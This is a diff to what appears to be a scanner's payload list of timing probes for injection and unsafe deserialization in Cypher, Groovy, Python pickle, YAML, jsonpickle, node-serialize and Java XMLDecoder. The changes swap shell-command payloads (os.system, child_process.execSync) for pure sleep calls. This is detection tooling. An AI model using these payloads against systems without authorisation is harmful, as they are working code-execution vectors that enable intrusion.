@@ -10,14 +10,14 @@ __import__('time').sleep(5)
 ' OR 1=1 WITH 1 AS x CALL apoc.util.sleep(5000) RETURN x //
 ##Groovy Code Injection - Timing##
 Thread.sleep(5000)
-##Python Pickle P0 - Timing (sleep 5)##
-Y29zCnN5c3RlbQooUydzbGVlcCA1Jwp0Ui4=
+##Python Pickle P0 - Timing (time.sleep 5)##
+Y3RpbWUKc2xlZXAKKEk1CnRSLg==
 ##Python YAML - Timing (sleep 5)##
-!!python/object/apply:os.system ["sleep 5"]
+!!python/object/apply:time.sleep [5]
 ##Python jsonpickle - Timing (sleep 5)##
 {"py/reduce":[{"py/function":"time.sleep"},{"py/tuple":[5]}]}
 ##Node node-serialize - Timing (sleep 5)##
-{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('sleep 5')}()"}
+{"rce":"_$$ND_FUNC$$_function(){var d=Date.now()+5000;while(Date.now()<d){}}()"}
 ##XMLDecoder - Timing (sleep 5)##
 <java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.lang.Thread" method="sleep"><long>5000</long></object></java>
 ##.NET Json.NET - Timing (timeout 5)##
